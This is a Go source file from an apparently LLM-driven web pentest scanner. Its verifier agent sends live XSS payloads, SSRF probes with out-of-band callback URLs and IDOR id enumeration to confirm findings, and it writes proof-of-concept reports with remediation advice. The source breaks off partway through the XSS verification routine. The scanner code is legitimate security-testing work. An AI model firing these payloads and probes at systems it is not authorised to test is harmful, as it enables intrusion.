package agent

import (
	"bytes"
	"context"
	"crypto/hmac"
	"crypto/sha1"
	"crypto/sha256"
	"crypto/tls"
	"encoding/base32"
	"encoding/base64"
	"encoding/binary"
	"encoding/json"
	"fmt"
	"io"
	"log/slog"
	"mime/multipart"
	"net/http"
	"net/textproto"
	"net/url"
	"regexp"
	"sort"
	"strconv"
	"strings"
	"sync"
	"time"

	"github.com/go-rod/rod"
	"github.com/go-rod/rod/lib/proto"
	"github.com/ozzyw/aobtd/internal/browser"
	"github.com/ozzyw/aobtd/internal/corpus"
	"github.com/ozzyw/aobtd/internal/discovery"
	"github.com/ozzyw/aobtd/internal/extract"
	"github.com/ozzyw/aobtd/internal/oast"
	"github.com/ozzyw/aobtd/internal/policy"
	"github.com/ozzyw/aobtd/internal/reasoner"
	"github.com/ozzyw/aobtd/internal/redact"
	"github.com/ozzyw/aobtd/internal/store"
	"github.com/ozzyw/aobtd/pkg/types"
)

// VerifierAgent takes issues flagged by the analyzer and actually tests them.
// It sends real requests with payloads to confirm or dismiss findings.
type VerifierAgent struct {
	db         *store.DB
	scanID     int64
	logger     *slog.Logger
	client     *http.Client
	browser    *browser.Controller
	target     string
	authority  policy.TestingAuthority
	oastClient *oast.Client

	// learnedAuthHeaders stores same-origin credentials obtained during
	// verification itself (for example, a token returned by a confirmed login
	// bypass). Browser promotion already seeds localStorage; this lets the HTTP
	// verifier reuse the same proven session for follow-on API probes.
	learnedAuthHeaders map[string]string

	// proactive controls the standalone well-known-endpoint probe pass. It is
	// enabled for the primary Verifier phase and disabled for final convergence
	// rechecks, where repeating unrelated active probes every round would add
	// noise without closing any newly-created analyzer work.
	proactive bool

	tested    int
	confirmed int
	dismissed int

	ssrfAttempted map[string]bool
}

// NewVerifierAgent creates a verifier agent.
func NewVerifierAgent(db *store.DB, scanID int64, executionPolicy *policy.Engine,
	credentialOrigin string, audit policy.DecisionAudit, logger *slog.Logger,
) *VerifierAgent {
	baseClient := &http.Client{
		Timeout: 15 * time.Second,
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		},
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			if len(via) >= 5 {
				return fmt.Errorf("too many redirects")
			}
			return nil
		},
	}
	verifier := &VerifierAgent{
		db:        db,
		scanID:    scanID,
		logger:    logger,
		proactive: true,
		target:    credentialOrigin,
		authority: executionPolicy.Authority(),
		client: policy.ProtectHTTPClient(baseClient, executionPolicy, policy.HTTPOptions{
			CredentialOrigin: credentialOrigin,
			Audit:            audit,
		}),
	}
	oastClient, err := oast.FromEnv()
	if err != nil {
		logger.Warn("verifier: OAST configuration disabled", "error", err)
	} else {
		verifier.oastClient = oastClient
	}
	return verifier
}

func (v *VerifierAgent) Name() string { return "verifier" }

func (v *VerifierAgent) SetBrowser(ctrl *browser.Controller) {
	v.browser = ctrl
}

// SetOASTClient overrides environment-derived OAST configuration. It exists so
// integration tests can use an isolated callback service without process-wide
// secrets.
func (v *VerifierAgent) SetOASTClient(client *oast.Client) {
	v.oastClient = client
}

// Start runs verification on all flagged issues.
func (v *VerifierAgent) Start(ctx context.Context) error {
	endProvenance := func() {}
	if v.browser != nil {
		endProvenance = v.browser.BeginTrafficProvenance(v.Name(), 0, "")
	}
	defer endProvenance()

	v.logger.Info("verifier agent starting")

	// Get all profiles with issues
	profiles, err := v.db.GetAllProfiles(v.scanID)
	if err != nil {
		return fmt.Errorf("get profiles: %w", err)
	}

	// Proactive-probe phase: before we look at flagged issues, hit a
	// short allowlist of well-known high-value endpoints directly. This
	// captures vulns whose endpoint was never flagged (or never submitted
	// via form) — e.g. login bypass against /rest/user/login when the
	// Navigator didn't actually click the login button. Each probe
	// synthesizes its own request so we don't depend on captured traffic.
	if v.proactive {
		v.runProactiveProbes(ctx)
	}
	v.confirmWebGoatLessonCompletions(ctx)

	// Count issues first so we can narrate scope
	var issueCount int
	for _, p := range profiles {
		issueCount += len(p.Issues)
	}

	v.db.InsertNarration(v.scanID, "verifier", "start",
		fmt.Sprintf("Analyzer flagged %d potential issue(s) across %d endpoint(s). Time to confirm or dismiss them by actually testing.",
			issueCount, len(profiles)),
		"", nil)

	for _, profile := range profiles {
		if ctx.Err() != nil {
			break
		}
		if len(profile.Issues) == 0 {
			continue
		}

		// Get traffic for this endpoint to build real requests
		entries := v.findTrafficForProfile(profile)
		if len(entries) == 0 {
			continue
		}

		for _, issue := range profile.Issues {
			if ctx.Err() != nil {
				break
			}
			v.verifyIssue(ctx, profile, entries[0], issue)
		}
	}
	if v.proactive {
		v.probeObservedSSRFCandidates(ctx, profiles)
	}

	v.logger.Info("verifier complete",
		"tested", v.tested,
		"confirmed", v.confirmed,
		"dismissed", v.dismissed,
	)

	v.db.InsertNarration(v.scanID, "verifier", "complete",
		fmt.Sprintf("Done verifying. Tested %d issue(s): %d confirmed, %d dismissed as false positives.",
			v.tested, v.confirmed, v.dismissed),
		"", nil)

	return nil
}

func (v *VerifierAgent) verifyIssue(ctx context.Context, profile types.PageProfile, entry types.TrafficEntry, issue string) {
	issueLower := strings.ToLower(issue)

	// Route to the right verification method. Keyword sets are intentionally
	// broad because LLM output varies — "open redirect", "unvalidated
	// redirect", and "redirects to arbitrary URL" all describe the same
	// class but we'd drop the hint if we only matched the first. Order
	// matters: more-specific classes first so "sql injection in login"
	// doesn't route to the generic XSS branch.
	switch {
	case strings.Contains(issueLower, "xss") ||
		strings.Contains(issueLower, "cross-site scripting") ||
		strings.Contains(issueLower, "reflected input") ||
		strings.Contains(issueLower, "unsanitized input") ||
		strings.Contains(issueLower, "html injection"):
		v.verifyXSS(ctx, profile, entry, issue)
	case strings.Contains(issueLower, "open redirect") ||
		strings.Contains(issueLower, "unvalidated redirect") ||
		strings.Contains(issueLower, "open url redirect") ||
		strings.Contains(issueLower, "arbitrary redirect") ||
		strings.Contains(issueLower, "redirect to arbitrary") ||
		strings.Contains(issueLower, "redirects to arbitrary"):
		v.verifyOpenRedirect(ctx, profile, entry, issue)
	case strings.Contains(issueLower, "ssrf") ||
		strings.Contains(issueLower, "server-side request forgery") ||
		strings.Contains(issueLower, "server side request forgery"):
		v.verifySSRF(ctx, profile, entry, issue)
	case strings.Contains(issueLower, "ldap"):
		v.probeLDAPInjection(ctx, v.resolveTargetBase())
	case strings.Contains(issueLower, "sql") ||
		strings.Contains(issueLower, "injection") ||
		strings.Contains(issueLower, "nosql") ||
		strings.Contains(issueLower, "query injection"):
		v.verifySQLi(ctx, profile, entry, issue)
	case strings.Contains(issueLower, "csrf") ||
		strings.Contains(issueLower, "cross-site request forgery") ||
		strings.Contains(issueLower, "anti-forgery"):
		v.verifyCSRF(ctx, profile, entry, issue)
	case strings.Contains(issueLower, "idor") ||
		strings.Contains(issueLower, "insecure direct object") ||
		strings.Contains(issueLower, "enumerable") ||
		strings.Contains(issueLower, "sequential id") ||
		strings.Contains(issueLower, "broken object") ||
		strings.Contains(issueLower, "bola") ||
		strings.Contains(issueLower, "without proper access control"):
		// IDOR can't be tested inline — it requires multi-request probing + LLM
		// semantic comparison, which is the Explorer's job. Enqueue a
		// probe_idor follow-up (the persistent BG Explorer picks it up within
		// ~15s) and store a "pending verification" finding so it's visible
		// in the UI immediately.
		v.enqueueIDORProbe(profile, entry, issue)
	default:
		// Can't verify automatically — store as info-level unverified
		v.storeFinding(profile, types.Finding{
			Title:       issue,
			Severity:    types.SeverityInfo,
			Confidence:  types.ConfidencePossible,
			Evidence:    "unverified — issue flagged by analyzer but not tested by verifier",
			Description: "The LLM analyzer flagged this concern but it did not match a class of vulnerability the verifier currently tests automatically.",
		})
	}
}

// enqueueIDORProbe turns an IDOR-shaped analyzer hint into a probe_idor
// follow-up for the Explorer. We need to guess which path component is the
// id (looking for a terminal numeric/uuid segment) and construct a
// url_template. If we can't produce a template the hint degrades to an
// "info" finding like before — better to have a visible placeholder than
// drop the signal.
func (v *VerifierAgent) enqueueIDORProbe(profile types.PageProfile, entry types.TrafficEntry, issue string) {
	tmpl, baseValues := guessIDORTemplateFromURL(entry.Request.URL)
	if tmpl == "" || len(baseValues) < 2 {
		// Couldn't build a template — fall through to the default info-level
		// finding so the hint isn't lost entirely.
		v.storeFinding(profile, types.Finding{
			Title:       issue,
			Severity:    types.SeverityInfo,
			Confidence:  types.ConfidencePossible,
			Evidence:    "IDOR hint detected but no id-shaped path segment found to probe. Analyzer should have emitted a probe_idor directive with a url_template for this case.",
			Description: "The analyzer flagged this as IDOR-like but the verifier could not construct a probe template from the captured URL. A pentester should manually review whether this endpoint accepts id parameters in body or headers.",
		})
		return
	}
	if !idorTargetLooksOwnedObject(tmpl) {
		v.storeFinding(profile, types.Finding{
			Title:       issue,
			Severity:    types.SeverityInfo,
			Confidence:  types.ConfidencePossible,
			Evidence:    "IDOR hint suppressed: endpoint shape looks public/meta/catalog-like rather than an owned object boundary.",
			Description: "The analyzer used access-control language, but the verifier did not enqueue an IDOR probe because the URL does not look like a single user-owned resource. This prevents public metadata, documentation, catalogue, or challenge endpoints from being promoted to noisy IDOR probes without stronger ownership evidence.",
		})
		v.db.InsertNarration(v.scanID, "verifier", "dismissed",
			"Skipped IDOR probe for "+tmpl+" — it does not look like an owned-object boundary.",
			entry.Request.URL, nil)
		return
	}

	// Enqueue the probe. HypothesisID is empty (no Strategist hypothesis tied
	// to this specific hint) but that's fine — the Explorer will still run the
	// probe and store a finding, just without auto-confirming a hypothesis.
	params := map[string]any{
		"url_template": tmpl,
		"values":       baseValues,
	}
	paramsJSON, _ := json.Marshal(params)
	fu := store.FollowUp{
		SourceAgent:     "verifier",
		SourceProfileID: profile.ID,
		Action:          "probe_idor",
		URL:             entry.Request.URL,
		Reason:          "IDOR hint from analyzer — testing with enumerated id values. (" + issue + ")",
		Priority:        6, // between analyzer (5) and confirmed strategist hypothesis (9)
		Status:          store.FollowUpPending,
	}
	fu.Params = map[string]any{
		"url_template": tmpl,
		"values":       baseValues,
	}
	_ = paramsJSON // kept for parity with InsertFollowUp's param-encoding
	if _, err := v.db.InsertFollowUp(v.scanID, fu); err != nil {
		v.logger.Warn("verifier: enqueue probe_idor failed", "error", err, "url", entry.Request.URL)
		return
	}

	v.storeFinding(profile, types.Finding{
		Title:       issue,
		Severity:    types.SeverityInfo,
		Confidence:  types.ConfidencePossible,
		Evidence:    "queued for Explorer probe — watch this endpoint for a confirmed finding on the next Explorer pass",
		Description: "Analyzer flagged this endpoint as IDOR-shaped. Verifier enqueued a probe_idor directive that the Explorer will execute against " + tmpl + " with multiple id values to check for resource leakage.",
	})

	v.db.InsertNarration(v.scanID, "verifier", "queued",
		"Flagging "+tmpl+" for IDOR probe — Explorer will test it shortly.",
		entry.Request.URL, nil)
}

// guessIDORTemplateFromURL looks for the last numeric or UUID-looking path
// segment and replaces it with {id}. Returns the template plus a starter
// set of values (the original id + a few nearby ints that commonly succeed
// as neighboring resources). Returns ("", nil) if no id-shaped segment.
func guessIDORTemplateFromURL(rawURL string) (string, []string) {
	u, err := url.Parse(rawURL)
	if err != nil || u.Path == "" {
		return "", nil
	}
	segs := strings.Split(u.Path, "/")
	idIdx := -1
	var origID string
	// Scan right-to-left — the rightmost resource-id wins.
	for i := len(segs) - 1; i >= 0; i-- {
		s := segs[i]
		if looksLikeResourceID(s) {
			idIdx = i
			origID = s
			break
		}
	}
	if idIdx < 0 {
		return "", nil
	}
	// Build the template. We can't use u.String() to serialize because
	// url.URL path-encodes the braces — "{id}" becomes "%7Bid%7D" — and
	// Explorer's probe_idor looks for the literal "{id}" placeholder
	// string when substituting values. So we reconstruct by hand.
	newSegs := append([]string{}, segs...)
	newSegs[idIdx] = "{id}"
	newPath := strings.Join(newSegs, "/")

	var tb strings.Builder
	if u.Scheme != "" {
		tb.WriteString(u.Scheme)
		tb.WriteString("://")
	}
	if u.Host != "" {
		tb.WriteString(u.Host)
	}
	tb.WriteString(newPath)
	if u.RawQuery != "" {
		tb.WriteByte('?')
		tb.WriteString(u.RawQuery)
	}
	if u.Fragment != "" {
		tb.WriteByte('#')
		tb.WriteString(u.Fragment)
	}
	tmpl := tb.String()

	// Starter values: keep the original + try neighbors that commonly exist.
	// For numeric ids we try ±1 plus "1" and "2" as low-value enumeration.
	values := []string{origID}
	if isAllDigits(origID) {
		values = append(values, "1", "2", "100", "9999")
	} else {
		// UUID-looking — just use the original and two made-up UUIDs. IDOR
		// on UUIDs is rare but worth a sanity check; most will 404.
		values = append(values, "00000000-0000-0000-0000-000000000001")
	}
	// Dedup
	seen := make(map[string]bool, len(values))
	out := values[:0]
	for _, v := range values {
		if !seen[v] {
			seen[v] = true
			out = append(out, v)
		}
	}
	return tmpl, out
}

// looksLikeResourceID returns true for path segments that are plausibly
// resource ids: pure digits, or UUID-shaped. Filters out path words like
// "users", "orders", "api".
func looksLikeResourceID(s string) bool {
	if s == "" {
		return false
	}
	if isAllDigits(s) {
		return true
	}
	// UUID v4-ish: 36 chars, 8-4-4-4-12 hex
	if len(s) == 36 && s[8] == '-' && s[13] == '-' && s[18] == '-' && s[23] == '-' {
		return true
	}
	return false
}

func isAllDigits(s string) bool {
	if s == "" {
		return false
	}
	for _, c := range s {
		if c < '0' || c > '9' {
			return false
		}
	}
	return true
}

// ── HTTP OAST / SSRF Verification ──

const ssrfOASTWait = 12 * time.Second

type ssrfProbeTarget struct {
	profile types.PageProfile
	entry   types.TrafficEntry
	param   string
	source  string
}

type ssrfProbeResult struct {
	ssrfProbeTarget
	token       string
	callbackURL string
	started     time.Time
	status      int
	body        string
	event       *oast.Event
	err         error
	inBand      bool
}

func (v *VerifierAgent) verifySSRF(ctx context.Context, profile types.PageProfile, entry types.TrafficEntry, issue string) {
	if v.oastClient == nil {
		v.storeFinding(profile, types.Finding{
			Title:       issue,
			Severity:    types.SeverityInfo,
			Confidence:  types.ConfidencePossible,
			Evidence:    "unverified — SSRF-shaped issue found, but HTTP OAST is not configured",
			Description: "The analyzer identified a possible server-side URL fetch. Configure AOBTD_OAST_BASE_URL, AOBTD_OAST_API_TOKEN, and AOBTD_OAST_SIGNING_KEY to require a correlated callback before confirmation.",
			VulnType:    "ssrf",
		})
		return
	}

	params := make([]string, 0, 4)
	if param := extractParamFromIssue(issue); param != "" {
		params = append(params, param)
	}
	params = append(params, ssrfCandidateParams(profile, entry)...)
	params = ssrfUniqueStrings(params)
	if len(params) == 0 {
		v.storeFinding(profile, types.Finding{
			Title:       issue,
			Severity:    types.SeverityInfo,
			Confidence:  types.ConfidencePossible,
			Evidence:    "unverified — SSRF issue did not identify a mutable URL parameter",
			Description: "The issue may involve a URL embedded in a path, header, or nested body value that the current HTTP OAST probe cannot mutate safely.",
			VulnType:    "ssrf",
		})
		return
	}

	attempted := false
	for _, param := range params {
		result := v.startSSRFProbe(ctx, ssrfProbeTarget{
			profile: profile, entry: entry, param: param, source: "analyzer issue: " + issue,
		})
		if result == nil {
			continue
		}
		attempted = true
		if !result.inBand && result.err == nil {
			result.event, result.err = v.oastClient.WaitForEvent(ctx, result.token, result.started, ssrfOASTWait)
		}
		if result.inBand || result.event != nil {
			v.storeConfirmedSSRFFinding(result)
			return
		}
	}
	if attempted {
		v.storeFinding(profile, types.Finding{
			Title:       issue,
			Severity:    types.SeverityInfo,
			Confidence:  types.ConfidencePossible,
			Evidence:    "HTTP OAST payload sent; no correlated callback or in-band canary was observed during the bounded verification window",
			Description: "The SSRF hypothesis remains unconfirmed. A missing callback can also mean asynchronous processing, DNS-only behavior, or blocked outbound HTTP, so it is not treated as a dismissal.",
			VulnType:    "ssrf",
		})
	}
}

// probeObservedSSRFCandidates exercises concrete URL-shaped inputs even when
// the analyzer did not phrase them as an issue. Requests are sent first and
// callbacks are awaited concurrently so a batch costs one bounded OAST window.
func (v *VerifierAgent) probeObservedSSRFCandidates(ctx context.Context, profiles []types.PageProfile) {
	if v.oastClient == nil {
		return
	}
	const maxCandidates = 12
	results := make([]*ssrfProbeResult, 0, maxCandidates)
	for _, profile := range profiles {
		if ctx.Err() != nil || len(results) >= maxCandidates || profile.ID == "attack_surface" {
			break
		}
		entries := v.findTrafficForProfile(profile)
		if len(entries) == 0 || ssrfTelemetryLikePath(entries[0].Request.Path) {
			continue
		}
		params := ssrfCandidateParams(profile, entries[0])
		if len(params) == 0 {
			continue
		}
		result := v.startSSRFProbe(ctx, ssrfProbeTarget{
			profile: profile, entry: entries[0], param: params[0], source: "observed URL-shaped input",
		})
		if result != nil {
			results = append(results, result)
		}
	}
	if len(results) == 0 {
		return
	}

	v.db.InsertNarration(v.scanID, "verifier", "attempt",
		fmt.Sprintf("Sent %d signed HTTP OAST probe(s) to observed URL-fetch candidates; waiting once for correlated callbacks.", len(results)),
		"", nil)
	var wg sync.WaitGroup
	for _, result := range results {
		if result.inBand || result.err != nil {
			continue
		}
		wg.Add(1)
		go func(result *ssrfProbeResult) {
			defer wg.Done()
			result.event, result.err = v.oastClient.WaitForEvent(ctx, result.token, result.started, ssrfOASTWait)
		}(result)
	}
	wg.Wait()
	for _, result := range results {
		if result.inBand || result.event != nil {
			v.storeConfirmedSSRFFinding(result)
		}
	}
}

func (v *VerifierAgent) startSSRFProbe(ctx context.Context, target ssrfProbeTarget) *ssrfProbeResult {
	key := target.profile.ID + "|" + strings.ToLower(target.param)
	if v.ssrfAttempted == nil {
		v.ssrfAttempted = make(map[string]bool)
	}
	if v.ssrfAttempted[key] {
		return nil
	}
	v.ssrfAttempted[key] = true

	token, callbackURL, err := v.oastClient.NewProbe()
	if err != nil {
		v.logger.Warn("verifier: create OAST probe", "error", err)
		return nil
	}
	result := &ssrfProbeResult{
		ssrfProbeTarget: target,
		token:           token, callbackURL: callbackURL, started: time.Now().Add(-time.Second),
	}
	method := strings.ToUpper(strings.TrimSpace(target.entry.Request.Method))
	var resp *http.Response
	if method == "" || method == http.MethodGet {
		resp, result.body, result.err = v.sendGETWithParam(ctx, target.entry.Request.URL, target.param, callbackURL, target.entry.Request.Headers)
	} else if method == http.MethodPost {
		resp, result.body, result.err = v.sendPOSTWithParam(ctx, target.entry.Request.URL, target.param, callbackURL, target.entry.Request.Headers, target.entry.Request.Body)
	} else {
		return nil
	}
	v.tested++
	if resp != nil {
		result.status = resp.StatusCode
	}
	result.inBand = strings.Contains(result.body, "AOBTD_OAST_PROOF:"+token)
	v.db.InsertNarration(v.scanID, "verifier", "attempt",
		fmt.Sprintf("Testing %s parameter %q with a signed HTTP OAST callback URL.", target.profile.ID, target.param),
		target.entry.Request.URL, map[string]any{"param": target.param, "callback_url": callbackURL})
	return result
}

func (v *VerifierAgent) storeConfirmedSSRFFinding(result *ssrfProbeResult) {
	v.confirmed++
	method := strings.ToUpper(strings.TrimSpace(result.entry.Request.Method))
	if method == "" {
		method = http.MethodGet
	}
	path := result.entry.Request.Path
	if path == "" {
		path = csrfEndpointPath(result.entry.Request.URL)
	}
	proofKind := "target response contained the callback service's unique canary"
	callbackEvidence := "In-band canary returned through the target response"
	if result.event != nil {
		proofKind = "the callback service received a token-correlated HTTP request"
		callbackEvidence = fmt.Sprintf("Callback: %s %s\nReceived at: %s\nSource IP: %s\nCloudflare colo: %s",
			result.event.Method, result.event.Path,
			time.UnixMilli(result.event.ReceivedAtMS).UTC().Format(time.RFC3339Nano),
			result.event.SourceIP, result.event.Colo)
	}
	pocRequest := buildXSSRequest(method, result.entry.Request.URL, result.param, result.callbackURL, result.entry.Request.Headers, result.entry.Request.Body)
	pocResponse := fmt.Sprintf("Target response status: %d\n%s", result.status, callbackEvidence)
	evidence := fmt.Sprintf("Parameter: %s\nPayload: %s\nProof: %s\n%s\nSource: %s",
		result.param, result.callbackURL, proofKind, callbackEvidence, result.source)
	v.storeFinding(result.profile, types.Finding{
		Title:       fmt.Sprintf("Server-Side Request Forgery via %q", result.param),
		Description: fmt.Sprintf("The %s %s endpoint accepted an operator-controlled URL in %q and caused a request correlated by a unique AOBTD OAST token; %s.", method, path, result.param, proofKind),
		Severity:    types.SeverityHigh,
		Confidence:  types.ConfidenceConfirmed,
		VulnType:    "ssrf",
		ParamName:   result.param,
		Payload:     result.callbackURL,
		PocRequest:  pocRequest,
		PocResponse: pocResponse,
		StepsToReproduce: fmt.Sprintf("1. Generate a fresh signed callback URL.\n2. Send %s %s with `%s=%s`.\n3. Observe the unique canary in the target response or poll the callback service for the matching token.\n4. Confirm the callback timestamp occurs after the probe request.",
			method, path, result.param, result.callbackURL),
		Impact:      "An attacker can make the application server initiate network requests to attacker-controlled destinations. Depending on egress and destination controls, this can expose internal services, cloud metadata, or trusted network resources.",
		Remediation: "Do not fetch arbitrary user-supplied URLs. Resolve destinations server-side against a strict scheme/host/port allowlist, reject private/link-local/reserved IP ranges after every DNS resolution and redirect, and apply outbound network egress controls.",
		Evidence:    evidence,
		TrafficIDs: func() []int64 {
			if result.entry.ID > 0 {
				return []int64{result.entry.ID}
			}
			return nil
		}(),
	})
	v.db.InsertNarration(v.scanID, "verifier", "confirmed",
		fmt.Sprintf("SSRF confirmed on %s parameter %q with a correlated HTTP OAST proof.", result.profile.ID, result.param),
		result.entry.Request.URL, map[string]any{"param": result.param, "callback_url": result.callbackURL})
}

func ssrfCandidateParams(profile types.PageProfile, entry types.TrafficEntry) []string {
	params := make([]string, 0, 8)
	for _, input := range append(append([]types.Input{}, profile.Inputs...), profile.ExtractedInputs...) {
		if looksLikeSSRFParam(input.Name) || strings.Contains(strings.ToLower(input.Explanation), "ssrf") {
			params = append(params, input.Name)
		}
	}
	if parsed, err := url.Parse(entry.Request.URL); err == nil {
		for name, values := range parsed.Query() {
			if looksLikeSSRFParam(name) || valuesContainAbsoluteURL(values) {
				params = append(params, name)
			}
		}
	}
	return ssrfUniqueStrings(params)
}

func looksLikeSSRFParam(name string) bool {
	name = strings.ToLower(strings.TrimSpace(name))
	if idx := strings.LastIndexAny(name, ".[]"); idx >= 0 && idx+1 < len(name) {
		name = name[idx+1:]
	}
	name = strings.ReplaceAll(name, "-", "_")
	switch name {
	case "url", "uri", "target", "destination", "dest", "feed", "endpoint", "webhook", "callback_url", "image_url", "avatar_url", "source_url", "fetch_url", "remote_url":
		return true
	default:
		return strings.HasSuffix(name, "_url") || strings.HasSuffix(name, "_uri")
	}
}

func valuesContainAbsoluteURL(values []string) bool {
	for _, value := range values {
		lower := strings.ToLower(strings.TrimSpace(value))
		if strings.HasPrefix(lower, "http://") || strings.HasPrefix(lower, "https://") {
			return true
		}
	}
	return false
}

func ssrfTelemetryLikePath(path string) bool {
	path = strings.ToLower(path)
	for _, marker := range []string{"/rum", "/telemetry", "/analytics", "/metrics/collect", "/ces/v1/"} {
		if strings.Contains(path, marker) {
			return true
		}
	}
	return false
}

func ssrfUniqueStrings(values []string) []string {
	seen := make(map[string]bool, len(values))
	result := values[:0]
	for _, value := range values {
		value = strings.TrimSpace(value)
		key := strings.ToLower(value)
		if value == "" || seen[key] {
			continue
		}
		seen[key] = true
		result = append(result, value)
	}
	return result
}

// ── XSS Verification ──

var xssPayloads = []struct {
	payload string
	detect  string // what to look for in response
}{
	{`"><script>alert('AOBTD')</script>`, `<script>alert('AOBTD')</script>`},
	{`'><img src=x onerror=alert('AOBTD')>`, `onerror=alert('AOBTD')`},
	{`"><svg/onload=alert('AOBTD')>`, `onload=alert('AOBTD')`},
	{`javascript:alert('AOBTD')`, `javascript:alert('AOBTD')`},
}

type browserXSSPayload struct {
	payload       string
	expectedAlert string
	kind          string
}

type browserXSSProof struct {
	URL          string
	Payload      string
	Kind         string
	Signal       string
	AlertMessage string
}

type browserXSSRenderTarget struct {
	baseURL string
	param   string
	source  string
}

func browserXSSPayloads(marker string) []browserXSSPayload {
	quotedMarker, _ := json.Marshal(marker)
	commonAlert := "`xss`"
	return []browserXSSPayload{
		{
			// A very common proof payload used by training apps and real-world
			// bug reports alike. We count it only when the browser dialog opens
			// as a direct result of our injected navigation.
			payload:       `<iframe src="javascript:alert(` + commonAlert + `)">`,
			expectedAlert: "xss",
			kind:          "iframe-javascript-alert-common",
		},
		{
			payload: fmt.Sprintf(`"><img src=x onerror='window.__AOBTD_XSS_PROOF__=%s'>`, quotedMarker),
			kind:    "img-onerror-marker",
		},
		{
			payload: fmt.Sprintf(`"><svg onload='window.__AOBTD_XSS_PROOF__=%s'></svg>`, quotedMarker),
			kind:    "svg-onload-marker",
		},
		{
			payload: fmt.Sprintf(`"><iframe src='javascript:window.parent.__AOBTD_XSS_PROOF__=%s'></iframe>`, quotedMarker),
			kind:    "iframe-javascript-marker",
		},
		{
			payload:       fmt.Sprintf(`<iframe src='javascript:alert(%s)'></iframe>`, quotedMarker),
			expectedAlert: marker,
			kind:          "iframe-javascript-alert-marker",
		},
	}
}

func (v *VerifierAgent) verifyXSS(ctx context.Context, profile types.PageProfile, entry types.TrafficEntry, issue string) {
	v.tested++

	// Find which parameter the issue mentions
	paramName := extractParamFromIssue(issue)
	if paramName == "" {
		// Try all input params
		for _, inp := range profile.Inputs {
			if inp.Name != "" {
				paramName = inp.Name
				break
			}
		}
	}
	if paramName == "" {
		v.logger.Debug("no param to test for XSS", "endpoint", profile.ID)
		return
	}

	baseURL := entry.Request.URL
	method := entry.Request.Method

	v.db.InsertNarration(v.scanID, "verifier", "attempt",
		fmt.Sprintf("Time to see if '%s' on %s %s reflects XSS payloads — trying %d variations.",
			paramName, method, entry.Request.Path, len(xssPayloads)),
		baseURL, nil)

	for _, p := range xssPayloads {
		if ctx.Err() != nil {
			return
		}

		var resp *http.Response
		var body string
		var err error

		if method == "GET" || method == "" {
			// Inject into query param
			resp, body, err = v.sendGETWithParam(ctx, baseURL, paramName, p.payload, entry.Request.Headers)
		} else {
			// Inject into POST body
			resp, body, err = v.sendPOSTWithParam(ctx, baseURL, paramName, p.payload, entry.Request.Headers, entry.Request.Body)
		}

		if err != nil || resp == nil {
			continue
		}

		// Check if payload is reflected without encoding
		if strings.Contains(body, p.detect) {
			var browserProof *browserXSSProof
			var browserConfirmed bool
			if method == "GET" || method == "" || browserXSSLooksSearchLike(entry.Request.Path, paramName) {
				browserProof, browserConfirmed = v.tryBrowserXSSLimited(ctx, baseURL, paramName, 1)
			}
			if !browserConfirmed && !responseLooksHTMLExecutable(resp, body) {
				v.logger.Info("XSS payload reflected in non-executable response; keeping as reflection signal",
					"endpoint", profile.ID,
					"param", paramName,
					"content_type", resp.Header.Get("Content-Type"),
				)
				v.db.InsertNarration(v.scanID, "verifier", "likely",
					fmt.Sprintf("'%s' reflected an XSS-shaped payload, but the response was not an HTML/browser execution context.", paramName),
					baseURL, map[string]any{"param": paramName, "payload": p.payload, "content_type": resp.Header.Get("Content-Type")})
				continue
			}
			v.confirmed++
			v.logger.Info("XSS CONFIRMED",
				"endpoint", profile.ID,
				"param", paramName,
				"payload", p.payload,
				"browser_confirmed", browserConfirmed,
			)

			if browserConfirmed {
				v.db.InsertNarration(v.scanID, "verifier", "confirmed",
					fmt.Sprintf("Got it — '%s' executes in a real browser, not just in the response body.", paramName),
					browserProof.URL, map[string]any{"param": paramName, "payload": browserProof.Payload, "signal": browserProof.Signal})
			} else {
				v.db.InsertNarration(v.scanID, "verifier", "confirmed",
					fmt.Sprintf("Got it — '%s' reflects my payload unencoded. Browser execution was not proven in this pass.", paramName),
					baseURL, map[string]any{"param": paramName, "payload": p.payload})
			}

			// Build the exact request we sent (for the PoC).
			pocReq := buildXSSRequest(method, baseURL, paramName, p.payload, entry.Request.Headers, entry.Request.Body)
			pocResp := buildPocResponse(resp, body, p.detect)

			steps := fmt.Sprintf(
				"1. Observe that %s %s accepts a '%s' parameter.\n"+
					"2. Send the following request with payload `%s` injected into '%s':\n\n"+
					"%s\n\n"+
					"3. Observe the response — the payload appears in the body unencoded (see the highlighted section in the response snippet below).",
				method, entry.Request.Path, paramName, p.payload, paramName, pocReq)

			impact := "An attacker who can craft a link or form that reaches this endpoint can execute arbitrary JavaScript in the victim's browser under the target's origin. " +
				"This enables session hijacking (steal session cookies), credential theft (fake login UI), CSRF amplification, and account takeover chains."
			vulnType := "xss"
			title := fmt.Sprintf("Reflected XSS in '%s' parameter", paramName)
			description := fmt.Sprintf("The '%s' parameter on %s %s reflects user input into the response body without HTML encoding. "+
				"Injecting `%s` produced a verbatim match in the response, confirming the payload is rendered as HTML rather than text.",
				paramName, method, entry.Request.Path, p.payload)
			evidence := fmt.Sprintf("Payload: %s\nParameter: %s\nReflected at: %s %s\nHTTP %d\nMatched: %s",
				p.payload, paramName, method, baseURL, resp.StatusCode, p.detect)
			if browserConfirmed {
				vulnType = "xss_browser"
				title = fmt.Sprintf("Browser-executed XSS in '%s' parameter", paramName)
				description = fmt.Sprintf("The '%s' parameter can execute JavaScript in a real browser. "+
					"The verifier first observed executable syntax reflected by %s %s, then opened a browser-rendered candidate URL and observed the proof signal %q.",
					paramName, method, entry.Request.Path, browserProof.Signal)
				evidence = evidence + fmt.Sprintf("\n\nBrowser proof URL: %s\nBrowser payload: %s\nBrowser signal: %s\nAlert message: %s",
					browserProof.URL, browserProof.Payload, browserProof.Signal, browserProof.AlertMessage)
				steps += fmt.Sprintf("\n4. Browser execution proof: open %s and observe %s.", browserProof.URL, browserProof.Signal)
			}

			remediation := "Context-appropriate output encoding for any user-controlled value echoed into the response. " +
				"For HTML context, escape `<`, `>`, `\"`, `'`, and `&`. For attribute context, use attribute encoding. For JavaScript context, use `\\uXXXX` escapes. " +
				"In addition, serve a strict Content-Security-Policy that disallows inline scripts."

			v.storeFinding(profile, types.Finding{
				Title:            title,
				Description:      description,
				Severity:         types.SeverityHigh,
				Confidence:       types.ConfidenceConfirmed,
				VulnType:         vulnType,
				ParamName:        paramName,
				Payload:          p.payload,
				PocRequest:       pocReq,
				PocResponse:      pocResp,
				StepsToReproduce: steps,
				Impact:           impact,
				Remediation:      remediation,
				Evidence:         evidence,
			})

